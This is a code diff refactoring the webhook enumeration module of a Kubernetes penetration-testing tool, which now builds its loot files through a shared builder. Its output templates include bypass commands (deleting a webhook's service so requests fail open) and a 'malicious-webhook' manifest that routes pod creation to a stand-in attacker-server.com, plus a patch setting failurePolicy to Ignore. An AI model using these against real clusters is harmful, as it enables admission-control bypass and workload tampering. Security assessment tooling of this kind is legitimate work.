@@ -13,6 +13,7 @@ import (
 	"github.com/BishopFox/cloudfox/globals"
 	"github.com/BishopFox/cloudfox/internal"
 	k8sinternal "github.com/BishopFox/cloudfox/internal/kubernetes"
+	"github.com/BishopFox/cloudfox/kubernetes/shared"
 	"github.com/BishopFox/cloudfox/kubernetes/config"
 	"github.com/spf13/cobra"
 	corev1 "k8s.io/api/core/v1"
@@ -123,7 +124,8 @@ type BypassOpportunity struct {
 }
 
 func ListWebhooks(cmd *cobra.Command, args []string) {
-	ctx := context.Background()
+	ctx, cancel := shared.ContextWithTimeout()
+	defer cancel()
 	logger := internal.NewLogger()
 
 	parentCmd := cmd.Parent()
@@ -137,8 +139,6 @@ func ListWebhooks(cmd *cobra.Command, args []string) {
 	clientset := config.GetClientOrExit()
 
 	headers := []string{
-		"Risk",
-		"Score",
 		"Type",
 		"Name",
 		"FailurePolicy",
@@ -152,18 +152,7 @@ func ListWebhooks(cmd *cobra.Command, args []string) {
 
 	var findings []WebhookFinding
 	var outputRows [][]string
-	var lootEnum []string
-
-	lootEnum = append(lootEnum, `#####################################
-##### Enumerate Webhook Information
-#####################################
-#
-# Comprehensive webhook enumeration with security analysis
-#
-`)
-	if globals.KubeContext != "" {
-		lootEnum = append(lootEnum, fmt.Sprintf("kubectl config use-context %s\n", globals.KubeContext))
-	}
+	loot := shared.NewLootBuilder()
 
 	// Create dynamic client
 	restCfg, err := config.GetRESTConfig()
@@ -181,7 +170,7 @@ func ListWebhooks(cmd *cobra.Command, args []string) {
 	processWebhooks := func(gvr schema.GroupVersionResource, whType string) {
 		list, err := dynClient.Resource(gvr).List(ctx, metav1.ListOptions{})
 		if err != nil {
-			logger.ErrorM(fmt.Sprintf("Error listing %s: %v", whType, err), globals.K8S_WEBHOOKS_MODULE_NAME)
+			shared.LogListError(&logger, whType, "", err, globals.K8S_WEBHOOKS_MODULE_NAME, false)
 			return
 		}
 
@@ -377,7 +366,7 @@ func ListWebhooks(cmd *cobra.Command, args []string) {
 						}
 
 						for _, res := range resources {
-							if k8sinternal.IsSensitiveResource(res) && !Contains(sensitiveResources, res) {
+							if k8sinternal.IsSensitiveResource(res) && !shared.Contains(sensitiveResources, res) {
 								sensitiveResources = append(sensitiveResources, res)
 							}
 						}
@@ -494,7 +483,7 @@ func ListWebhooks(cmd *cobra.Command, args []string) {
 
 	crdList, err := dynClient.Resource(crdGVR).List(ctx, metav1.ListOptions{})
 	if err != nil {
-		logger.ErrorM(fmt.Sprintf("Error listing CRDs dynamically: %v", err), globals.K8S_WEBHOOKS_MODULE_NAME)
+		shared.LogListError(&logger, "customresourcedefinitions", "", err, globals.K8S_WEBHOOKS_MODULE_NAME, false)
 	} else {
 		for _, crd := range crdList.Items {
 			conversion, found, _ := unstructured.NestedMap(crd.Object, "spec", "conversion")
@@ -589,6 +578,9 @@ func ListWebhooks(cmd *cobra.Command, args []string) {
 	// Detect bypass opportunities
 	bypassOpportunities := detectBypassOpportunities(findings)
 
+	// Build loot files using LootBuilder
+	buildWebhookLootFiles(loot, findings, bypassOpportunities, chains, globals.KubeContext)
+
 	// Build output rows
 	for _, finding := range findings {
 		certExpiryStr := "N/A"
@@ -614,8 +606,6 @@ func ListWebhooks(cmd *cobra.Command, args []string) {
 		}
 
 		outputRows = append(outputRows, []string{
-			finding.RiskLevel,
-			fmt.Sprintf("%d", finding.RiskScore),
 			finding.Type,
 			finding.Name,
 			finding.FailurePolicy,
@@ -626,15 +616,6 @@ func ListWebhooks(cmd *cobra.Command, args []string) {
 			chainDepthStr,
 			fmt.Sprintf("%d", len(finding.SecurityIssues)),
 		})
-
-		// Add to loot enum
-		lootEnum = append(lootEnum, "")
-		lootEnum = append(lootEnum, fmt.Sprintf("# [%s - Score:%d] %s webhook: %s",
-			finding.RiskLevel, finding.RiskScore, finding.Type, finding.Name))
-		lootEnum = append(lootEnum,
-			fmt.Sprintf("kubectl get %s %s -o yaml", strings.ToLower(finding.Type)+"webhookconfigurations", finding.Name),
-			fmt.Sprintf("kubectl get %s %s -o json | jq '.webhooks[]'", strings.ToLower(finding.Type)+"webhookconfigurations", finding.Name),
-		)
 	}
 
 	// Sort findings by risk score descending
@@ -642,8 +623,8 @@ func ListWebhooks(cmd *cobra.Command, args []string) {
 		return findings[i].RiskScore > findings[j].RiskScore
 	})
 
-	// Generate all loot files
-	lootFiles := generateWebhookLootFiles(findings, bypassOpportunities, chains, globals.KubeContext)
+	// Build final loot files
+	lootFiles := loot.Build()
 
 	table := internal.TableFile{
 		Name:   "Webhooks",
@@ -671,19 +652,14 @@ func ListWebhooks(cmd *cobra.Command, args []string) {
 	}
 
 	if len(outputRows) > 0 {
-		criticalCount := 0
-		highCount := 0
+		riskCounts := shared.NewRiskCounts()
 		for _, f := range findings {
-			if f.RiskLevel == "CRITICAL" {
-				criticalCount++
-			} else if f.RiskLevel == "HIGH" {
-				highCount++
-			}
+			riskCounts.Add(f.RiskLevel)
 		}
 
-		if criticalCount > 0 || highCount > 0 {
+		if riskCounts.Critical > 0 || riskCounts.High > 0 {
 			logger.InfoM(fmt.Sprintf("%d webhooks found (%d CRITICAL, %d HIGH risk)",
-				len(outputRows), criticalCount, highCount), globals.K8S_WEBHOOKS_MODULE_NAME)
+				len(outputRows), riskCounts.Critical, riskCounts.High), globals.K8S_WEBHOOKS_MODULE_NAME)
 		} else {
 			logger.InfoM(fmt.Sprintf("%d webhooks found", len(outputRows)), globals.K8S_WEBHOOKS_MODULE_NAME)
 		}
@@ -821,13 +797,13 @@ func calculatePerformanceImpact(finding *WebhookFinding) (impact string, estimat
 	estimatedLatency = finding.TimeoutSeconds * 1000
 
 	if score >= 75 {
-		return "CRITICAL", estimatedLatency
+		return shared.RiskCritical, estimatedLatency
 	} else if score >= 50 {
-		return "HIGH", estimatedLatency
+		return shared.RiskHigh, estimatedLatency
 	} else if score >= 25 {
-		return "MEDIUM", estimatedLatency
+		return shared.RiskMedium, estimatedLatency
 	}
-	return "LOW", estimatedLatency
+	return shared.RiskLow, estimatedLatency
 }
 
 func calculateWebhookRiskScore(finding *WebhookFinding, hasWildcardOps, hasWildcardRes, interceptsSensitive bool) int {
@@ -884,9 +860,9 @@ func calculateWebhookRiskScore(finding *WebhookFinding, hasWildcardOps, hasWildc
 	}
 
 	// Performance impact
-	if finding.PerformanceImpact == "CRITICAL" {
+	if finding.PerformanceImpact == shared.RiskCritical {
 		score += 20
-	} else if finding.PerformanceImpact == "HIGH" {
+	} else if finding.PerformanceImpact == shared.RiskHigh {
 		score += 10
 	}
 
@@ -941,7 +917,7 @@ func detectBypassOpportunities(findings []WebhookFinding) []BypassOpportunity {
 				BypassType:     "namespace-selector",
 				BypassMethod:   "Create namespace with non-matching labels",
 				ExploitCommand: fmt.Sprintf("kubectl create ns bypass-%s", strings.ToLower(f.Name[:10])),
-				RiskLevel:      "HIGH",
+				RiskLevel:      shared.RiskHigh,
 			})
 		}
 
@@ -953,7 +929,7 @@ func detectBypassOpportunities(findings []WebhookFinding) []BypassOpportunity {
 				BypassType:     "object-selector",
 				BypassMethod:   "Create objects with non-matching labels",
 				ExploitCommand: "kubectl run bypass-pod --image=alpine --labels=bypass=true",
-				RiskLevel:      "HIGH",
+				RiskLevel:      shared.RiskHigh,
 			})
 		}
 
@@ -965,7 +941,7 @@ func detectBypassOpportunities(findings []WebhookFinding) []BypassOpportunity {
 				BypassType:     "failure-policy",
 				BypassMethod:   "Make webhook unavailable, requests will be allowed",
 				ExploitCommand: fmt.Sprintf("kubectl delete svc %s -n %s", f.Service, f.Namespace),
-				RiskLevel:      "CRITICAL",
+				RiskLevel:      shared.RiskCritical,
 			})
 		}
 
@@ -977,7 +953,7 @@ func detectBypassOpportunities(findings []WebhookFinding) []BypassOpportunity {
 				BypassType:     "dangling-service",
 				BypassMethod:   "Webhook has no backend service - requests timeout or fail open",
 				ExploitCommand: "# Deploy resources - webhook will fail",
-				RiskLevel:      "CRITICAL",
+				RiskLevel:      shared.RiskCritical,
 			})
 		}
 	}
@@ -985,72 +961,41 @@ func detectBypassOpportunities(findings []WebhookFinding) []BypassOpportunity {
 	return opportunities
 }
 
-func generateWebhookLootFiles(findings []WebhookFinding, bypasses []BypassOpportunity, chains map[string][]string, kubeContext string) []internal.LootFile {
-	var lootFiles []internal.LootFile
-
+func buildWebhookLootFiles(loot *shared.LootBuilder, findings []WebhookFinding, bypasses []BypassOpportunity, chains map[string][]string, kubeContext string) {
 	// 1. Security Analysis
-	lootSecurity := generateSecurityAnalysisLoot(findings, kubeContext)
-	lootFiles = append(lootFiles, internal.LootFile{
-		Name:     "Webhook-Security-Analysis",
-		Contents: strings.Join(lootSecurity, "\n"),
-	})
+	buildSecurityAnalysisLoot(loot, findings, kubeContext)
 
 	// 2. Certificate Analysis
-	lootCerts := generateCertificateLoot(findings, kubeContext)
-	lootFiles = append(lootFiles, internal.LootFile{
-		Name:     "Webhook-Certificates",
-		Contents: strings.Join(lootCerts, "\n"),
-	})
+	buildCertificateLoot(loot, findings, kubeContext)
 
 	// 3. Performance Analysis
-	lootPerf := generatePerformanceLoot(findings, kubeContext)
-	lootFiles = append(lootFiles, internal.LootFile{
-		Name:     "Webhook-Performance",
-		Contents: strings.Join(lootPerf, "\n"),
-	})
+	buildPerformanceLoot(loot, findings, kubeContext)
 
 	// 4. Webhook Chains
-	lootChains := generateChainsLoot(chains, findings, kubeContext)
-	lootFiles = append(lootFiles, internal.LootFile{
-		Name:     "Webhook-Chains",
-		Contents: strings.Join(lootChains, "\n"),
-	})
+	buildChainsLoot(loot, chains, findings, kubeContext)
 
 	// 5. Bypass Opportunities
-	lootBypass := generateBypassLoot(bypasses, kubeContext)
-	lootFiles = append(lootFiles, internal.LootFile{
-		Name:     "Webhook-Bypass-Opportunities",
-		Contents: strings.Join(lootBypass, "\n"),
-	})
+	buildBypassLoot(loot, bypasses, kubeContext)
 
 	// 6. Service Validation
-	lootService := generateServiceValidationLoot(findings, kubeContext)
-	lootFiles = append(lootFiles, internal.LootFile{
-		Name:     "Webhook-Service-Validation",
-		Contents: strings.Join(lootService, "\n"),
-	})
+	buildServiceValidationLoot(loot, findings, kubeContext)
 
 	// 7. Exploitation Techniques
-	lootExploit := generateExploitationLoot(findings, kubeContext)
-	lootFiles = append(lootFiles, internal.LootFile{
-		Name:     "Webhook-Exploitation",
-		Contents: strings.Join(lootExploit, "\n"),
-	})
-
-	return lootFiles
+	buildExploitationLoot(loot, findings, kubeContext)
 }
 
-func generateSecurityAnalysisLoot(findings []WebhookFinding, kubeContext string) []string {
-	loot := []string{`#####################################
+func buildSecurityAnalysisLoot(loot *shared.LootBuilder, findings []WebhookFinding, kubeContext string) {
+	section := loot.Section("Webhook-Security-Analysis")
+	section.SetHeader(`#####################################
 ##### Webhook Security Analysis
 #####################################
 #
 # Prioritized security findings by risk level
-#
-`}
+#`)
 
 	if kubeContext != "" {
-		loot = append(loot, fmt.Sprintf("kubectl config use-context %s\n", kubeContext))
+		section.Addf("kubectl config use-context %s", kubeContext)
+		section.AddBlank()
 	}
 
 	// Group by risk
@@ -1060,58 +1005,63 @@ func generateSecurityAnalysisLoot(findings []WebhookFinding, kubeContext string)
 
 	for _, f := range findings {
 		switch f.RiskLevel {
-		case "CRITICAL":
+		case shared.RiskCritical:
 			critical = append(critical, f)
-		case "HIGH":
+		case shared.RiskHigh:
 			high = append(high, f)
-		case "MEDIUM":
+		case shared.RiskMedium:
 			medium = append(medium, f)
 		}
 	}
 
 	if len(critical) > 0 {
-		loot = append(loot, fmt.Sprintf("\n## CRITICAL RISK WEBHOOKS (%d found)\n", len(critical)))
+		section.AddBlank()
+		section.Addf("## CRITICAL RISK WEBHOOKS (%d found)", len(critical))
+		section.AddBlank()
 		for _, f := range critical {
-			loot = append(loot, fmt.Sprintf("\n### [CRITICAL - Score:%d] %s: %s", f.RiskScore, f.Type, f.Name))
-			loot = append(loot, fmt.Sprintf("# Risk: %s", f.RiskDescription))
+			section.AddBlank()
+			section.Addf("### [CRITICAL - Score:%d] %s: %s", f.RiskScore, f.Type, f.Name)
+			section.Addf("# Risk: %s", f.RiskDescription)
 			if len(f.SecurityIssues) > 0 {
-				loot = append(loot, fmt.Sprintf("# Security Issues: %d", len(f.SecurityIssues)))
+				section.Addf("# Security Issues: %d", len(f.SecurityIssues))
 				for _, issue := range f.SecurityIssues {
-					loot = append(loot, fmt.Sprintf("#   - %s", issue))
+					section.Addf("#   - %s", issue)
 				}
 			}
 			if len(f.SensitiveResources) > 0 {
-				loot = append(loot, fmt.Sprintf("# SENSITIVE RESOURCES: %v", f.SensitiveResources))
+				section.Addf("# SENSITIVE RESOURCES: %v", f.SensitiveResources)
 			}
 		}
 	}
 
 	if len(high) > 0 {
-		loot = append(loot, fmt.Sprintf("\n## HIGH RISK WEBHOOKS (%d found)\n", len(high)))
+		section.AddBlank()
+		section.Addf("## HIGH RISK WEBHOOKS (%d found)", len(high))
+		section.AddBlank()
 		for _, f := range high {
-			loot = append(loot, fmt.Sprintf("\n### [HIGH - Score:%d] %s: %s", f.RiskScore, f.Type, f.Name))
+			section.AddBlank()
+			section.Addf("### [HIGH - Score:%d] %s: %s", f.RiskScore, f.Type, f.Name)
 			if len(f.SecurityIssues) > 0 {
 				for _, issue := range f.SecurityIssues {
-					loot = append(loot, fmt.Sprintf("# - %s", issue))
+					section.Addf("# - %s", issue)
 				}
 			}
 		}
 	}
-
-	return loot
 }
 
-func generateCertificateLoot(findings []WebhookFinding, kubeContext string) []string {
-	loot := []string{`#####################################
+func buildCertificateLoot(loot *shared.LootBuilder, findings []WebhookFinding, kubeContext string) {
+	section := loot.Section("Webhook-Certificates")
+	section.SetHeader(`#####################################
 ##### Webhook Certificate Analysis
 #####################################
 #
 # Certificate expiry and validity analysis
-#
-`}
+#`)
 
 	if kubeContext != "" {
-		loot = append(loot, fmt.Sprintf("kubectl config use-context %s\n", kubeContext))
+		section.Addf("kubectl config use-context %s", kubeContext)
+		section.AddBlank()
 	}
 
 	expired := []WebhookFinding{}
@@ -1131,135 +1081,150 @@ func generateCertificateLoot(findings []WebhookFinding, kubeContext string) []st
 	}
 
 	if len(expired) > 0 {
-		loot = append(loot, fmt.Sprintf("\n## EXPIRED CERTIFICATES (%d found)\n", len(expired)))
+		section.AddBlank()
+		section.Addf("## EXPIRED CERTIFICATES (%d found)", len(expired))
+		section.AddBlank()
 		for _, f := range expired {
-			loot = append(loot, fmt.Sprintf("\n### %s: %s", f.Type, f.Name))
-			loot = append(loot, fmt.Sprintf("# EXPIRED %d days ago", -f.DaysUntilExpiry))
-			loot = append(loot, fmt.Sprintf("# Subject: %s", f.CertificateSubject))
+			section.AddBlank()
+			section.Addf("### %s: %s", f.Type, f.Name)
+			section.Addf("# EXPIRED %d days ago", -f.DaysUntilExpiry)
+			section.Addf("# Subject: %s", f.CertificateSubject)
 		}
 	}
 
 	if len(expiringSoon) > 0 {
-		loot = append(loot, fmt.Sprintf("\n## EXPIRING SOON (%d found)\n", len(expiringSoon)))
+		section.AddBlank()
+		section.Addf("## EXPIRING SOON (%d found)", len(expiringSoon))
+		section.AddBlank()
 		for _, f := range expiringSoon {
-			loot = append(loot, fmt.Sprintf("\n### %s: %s - Expires in %d days", f.Type, f.Name, f.DaysUntilExpiry))
+			section.AddBlank()
+			section.Addf("### %s: %s - Expires in %d days", f.Type, f.Name, f.DaysUntilExpiry)
 		}
 	}
-
-	return loot
 }
 
-func generatePerformanceLoot(findings []WebhookFinding, kubeContext string) []string {
-	loot := []string{`#####################################
+func buildPerformanceLoot(loot *shared.LootBuilder, findings []WebhookFinding, kubeContext string) {
+	section := loot.Section("Webhook-Performance")
+	section.SetHeader(`#####################################
 ##### Webhook Performance Analysis
 #####################################
 #
 # Performance impact assessment
-#
-`}
+#`)
 
 	if kubeContext != "" {
-		loot = append(loot, fmt.Sprintf("kubectl config use-context %s\n", kubeContext))
+		section.Addf("kubectl config use-context %s", kubeContext)
+		section.AddBlank()
 	}
 
 	critical := []WebhookFinding{}
 	high := []WebhookFinding{}
 
 	for _, f := range findings {
-		if f.PerformanceImpact == "CRITICAL" {
+		if f.PerformanceImpact == shared.RiskCritical {
 			critical = append(critical, f)
-		} else if f.PerformanceImpact == "HIGH" {
+		} else if f.PerformanceImpact == shared.RiskHigh {
 			high = append(high, f)
 		}
 	}
 
 	if len(critical) > 0 {
-		loot = append(loot, fmt.Sprintf("\n## CRITICAL PERFORMANCE IMPACT (%d webhooks)\n", len(critical)))
+		section.AddBlank()
+		section.Addf("## CRITICAL PERFORMANCE IMPACT (%d webhooks)", len(critical))
+		section.AddBlank()
 		for _, f := range critical {
-			loot = append(loot, fmt.Sprintf("\n### %s: %s", f.Type, f.Name))
-			loot = append(loot, fmt.Sprintf("# Timeout: %ds | Latency: %dms", f.TimeoutSeconds, f.EstimatedLatencyMs))
-			loot = append(loot, fmt.Sprintf("# Failure Policy: %s", f.FailurePolicy))
+			section.AddBlank()
+			section.Addf("### %s: %s", f.Type, f.Name)
+			section.Addf("# Timeout: %ds | Latency: %dms", f.TimeoutSeconds, f.EstimatedLatencyMs)
+			section.Addf("# Failure Policy: %s", f.FailurePolicy)
 			if len(f.Operations) > 0 {
-				loot = append(loot, fmt.Sprintf("# Operations: %v", f.Operations))
+				section.Addf("# Operations: %v", f.Operations)
 			}
 		}
 	}
-
-	return loot
 }
 
-func generateChainsLoot(chains map[string][]string, findings []WebhookFinding, kubeContext string) []string {
-	loot := []string{`#####################################
+func buildChainsLoot(loot *shared.LootBuilder, chains map[string][]string, findings []WebhookFinding, kubeContext string) {
+	section := loot.Section("Webhook-Chains")
+	section.SetHeader(`#####################################
 ##### Webhook Chains Detection
 #####################################
 #
 # Multiple webhooks on same resources
-#
-`}
+#`)
 
 	if kubeContext != "" {
-		loot = append(loot, fmt.Sprintf("kubectl config use-context %s\n", kubeContext))
+		section.Addf("kubectl config use-context %s", kubeContext)
+		section.AddBlank()
 	}
 
 	if len(chains) == 0 {
-		loot = append(loot, "\n# No webhook chains detected\n")
-		return loot
+		section.AddBlank()
+		section.Add("# No webhook chains detected")
+		section.AddBlank()
+		return
 	}
 
-	loot = append(loot, fmt.Sprintf("\n## WEBHOOK CHAINS DETECTED (%d chains)\n", len(chains)))
+	section.AddBlank()
+	section.Addf("## WEBHOOK CHAINS DETECTED (%d chains)", len(chains))
+	section.AddBlank()
 
 	for key, webhooks := range chains {
-		loot = append(loot, fmt.Sprintf("\n### Chain: %s", key))
-		loot = append(loot, fmt.Sprintf("# Webhooks in chain: %d", len(webhooks)))
+		section.AddBlank()
+		section.Addf("### Chain: %s", key)
+		section.Addf("# Webhooks in chain: %d", len(webhooks))
 		for i, wh := range webhooks {
-			loot = append(loot, fmt.Sprintf("#   %d. %s", i+1, wh))
+			section.Addf("#   %d. %s", i+1, wh)
 		}
 	}
-
-	return loot
 }
 
-func generateBypassLoot(bypasses []BypassOpportunity, kubeContext string) []string {
-	loot := []string{`#####################################
+func buildBypassLoot(loot *shared.LootBuilder, bypasses []BypassOpportunity, kubeContext string) {
+	section := loot.Section("Webhook-Bypass-Opportunities")
+	section.SetHeader(`#####################################
 ##### Webhook Bypass Opportunities
 #####################################
 #
 # Identified bypass techniques
-#
-`}
+#`)
 
 	if kubeContext != "" {
-		loot = append(loot, fmt.Sprintf("kubectl config use-context %s\n", kubeContext))
+		section.Addf("kubectl config use-context %s", kubeContext)
+		section.AddBlank()
 	}
 
 	if len(bypasses) == 0 {
-		loot = append(loot, "\n# No bypass opportunities detected\n")
-		return loot
+		section.AddBlank()
+		section.Add("# No bypass opportunities detected")
+		section.AddBlank()
+		return
 	}
 
-	loot = append(loot, fmt.Sprintf("\n## BYPASS OPPORTUNITIES (%d found)\n", len(bypasses)))
+	section.AddBlank()
+	section.Addf("## BYPASS OPPORTUNITIES (%d found)", len(bypasses))
+	section.AddBlank()
 
 	for _, b := range bypasses {
-		loot = append(loot, fmt.Sprintf("\n### [%s] %s: %s", b.RiskLevel, b.WebhookType, b.WebhookName))
-		loot = append(loot, fmt.Sprintf("# Bypass Type: %s", b.BypassType))
-		loot = append(loot, fmt.Sprintf("# Method: %s", b.BypassMethod))
-		loot = append(loot, fmt.Sprintf("# Exploit: %s", b.ExploitCommand))
+		section.AddBlank()
+		section.Addf("### [%s] %s: %s", b.RiskLevel, b.WebhookType, b.WebhookName)
+		section.Addf("# Bypass Type: %s", b.BypassType)
+		section.Addf("# Method: %s", b.BypassMethod)
+		section.Addf("# Exploit: %s", b.ExploitCommand)
 	}
-
-	return loot
 }
 
-func generateServiceValidationLoot(findings []WebhookFinding, kubeContext string) []string {
-	loot := []string{`#####################################
+func buildServiceValidationLoot(loot *shared.LootBuilder, findings []WebhookFinding, kubeContext string) {
+	section := loot.Section("Webhook-Service-Validation")
+	section.SetHeader(`#####################################
 ##### Webhook Service Validation
 #####################################
 #
 # Service existence and endpoint health
-#
-`}
+#`)
 
 	if kubeContext != "" {
-		loot = append(loot, fmt.Sprintf("kubectl config use-context %s\n", kubeContext))
+		section.Addf("kubectl config use-context %s", kubeContext)
+		section.AddBlank()
 	}
 
 	dangling := []WebhookFinding{}
@@ -1274,76 +1239,79 @@ func generateServiceValidationLoot(findings []WebhookFinding, kubeContext string
 	}
 
 	if len(dangling) > 0 {
-		loot = append(loot, fmt.Sprintf("\n## DANGLING WEBHOOKS (%d found)\n", len(dangling)))
-		loot = append(loot, "# These webhooks reference non-existent services\n")
+		section.AddBlank()
+		section.Addf("## DANGLING WEBHOOKS (%d found)", len(dangling))
+		section.AddBlank()
+		section.Add("# These webhooks reference non-existent services")
+		section.AddBlank()
 		for _, f := range dangling {
-			loot = append(loot, fmt.Sprintf("\n### %s: %s", f.Type, f.Name))
-			loot = append(loot, fmt.Sprintf("# Expected: %s/%s (DOES NOT EXIST)", f.Namespace, f.Service))
+			section.AddBlank()
+			section.Addf("### %s: %s", f.Type, f.Name)
+			section.Addf("# Expected: %s/%s (DOES NOT EXIST)", f.Namespace, f.Service)
 		}
 	}
 
 	if len(noEndpoints) > 0 {
-		loot = append(loot, fmt.Sprintf("\n## NO ENDPOINTS (%d found)\n", len(noEndpoints)))
+		section.AddBlank()
+		section.Addf("## NO ENDPOINTS (%d found)", len(noEndpoints))
+		section.AddBlank()
 		for _, f := range noEndpoints {
-			loot = append(loot, fmt.Sprintf("\n### %s: %s", f.Type, f.Name))
-			loot = append(loot, fmt.Sprintf("# Service: %s/%s (no endpoints)", f.Namespace, f.Service))
+			section.AddBlank()
+			section.Addf("### %s: %s", f.Type, f.Name)
+			section.Addf("# Service: %s/%s (no endpoints)", f.Namespace, f.Service)
 		}
 	}
-
-	return loot
 }
 
-func generateExploitationLoot(findings []WebhookFinding, kubeContext string) []string {
-	loot := []string{`#####################################
+func buildExploitationLoot(loot *shared.LootBuilder, findings []WebhookFinding, kubeContext string) {
+	section := loot.Section("Webhook-Exploitation")
+	section.SetHeader(`#####################################
 ##### Webhook Exploitation Techniques
 #####################################
 #
 # MANUAL EXECUTION REQUIRED
 # Educational purposes - use responsibly
-#
-`}
+#`)
 
 	if kubeContext != "" {
-		loot = append(loot, fmt.Sprintf("kubectl config use-context %s\n", kubeContext))
+		section.Addf("kubectl config use-context %s", kubeContext)
+		section.AddBlank()
 	}
 
-	loot = append(loot, `
-## 1. Deploy Malicious Webhook
-# If you can create webhook configurations:
-
-cat <<EOF | kubectl apply -f -
-apiVersion: admissionregistration.k8s.io/v1
-kind: MutatingWebhookConfiguration
-metadata:
-  name: malicious-webhook
-webhooks:
-- name: inject.malicious.com
-  clientConfig:
-    url: https://attacker-server.com/mutate
-  rules:
-  - operations: ["CREATE"]
-    apiGroups: [""]
-    apiVersions: ["v1"]
-    resources: ["pods"]
-  admissionReviewVersions: ["v1"]
-  sideEffects: None
-  failurePolicy: Ignore
-EOF
-
-## 2. Modify Existing Webhook
-# Change failurePolicy to bypass:
-kubectl patch mutatingwebhookconfiguration <name> -p '{"webhooks":[{"name":"<webhook>","failurePolicy":"Ignore"}]}'
-
-## 3. External Webhooks Found:
-`)
+	section.AddBlank()
+	section.Add("## 1. Deploy Malicious Webhook")
+	section.Add("# If you can create webhook configurations:")
+	section.AddBlank()
+	section.Add("cat <<EOF | kubectl apply -f -")
+	section.Add("apiVersion: admissionregistration.k8s.io/v1")
+	section.Add("kind: MutatingWebhookConfiguration")
+	section.Add("metadata:")
+	section.Add("  name: malicious-webhook")
+	section.Add("webhooks:")
+	section.Add("- name: inject.malicious.com")
+	section.Add("  clientConfig:")
+	section.Add("    url: https://attacker-server.com/mutate")
+	section.Add("  rules:")
+	section.Add("  - operations: [\"CREATE\"]")
+	section.Add("    apiGroups: [\"\"]")
+	section.Add("    apiVersions: [\"v1\"]")
+	section.Add("    resources: [\"pods\"]")
+	section.Add("  admissionReviewVersions: [\"v1\"]")
+	section.Add("  sideEffects: None")
+	section.Add("  failurePolicy: Ignore")
+	section.Add("EOF")
+	section.AddBlank()
+	section.Add("## 2. Modify Existing Webhook")
+	section.Add("# Change failurePolicy to bypass:")
+	section.Add("kubectl patch mutatingwebhookconfiguration <name> -p '{\"webhooks\":[{\"name\":\"<webhook>\",\"failurePolicy\":\"Ignore\"}]}'")
+	section.AddBlank()
+	section.Add("## 3. External Webhooks Found:")
 
 	for _, f := range findings {
 		if f.IsExternal {
-			loot = append(loot, fmt.Sprintf("# - %s: %s -> %s", f.Type, f.Name, f.Path))
+			section.Addf("# - %s: %s -> %s", f.Type, f.Name, f.Path)
 		}
 	}
-
-	return loot
 }
 
 func webhooksMin(a, b int) int {
